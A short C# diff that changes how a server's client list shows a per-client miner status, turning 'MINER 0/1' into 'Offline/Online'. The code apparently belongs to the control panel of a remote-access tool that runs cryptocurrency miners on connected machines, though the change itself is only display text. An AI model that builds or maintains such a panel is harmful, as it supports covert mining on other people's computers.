@@ -13,7 +13,7 @@ namespace Server.Handle_Packet
             {
                 lock (Settings.LockListviewClients)
                     if (client.LV != null)
-                        client.LV.SubItems[Program.form1.lv_prefor.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString;
+                        client.LV.SubItems[Program.form1.lv_prefor.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString.Replace("MINER 0", "MINER Offline").Replace("MINER 1", "MINER Online");
                     else
                         Debug.WriteLine("Temp socket pinged server");
             }
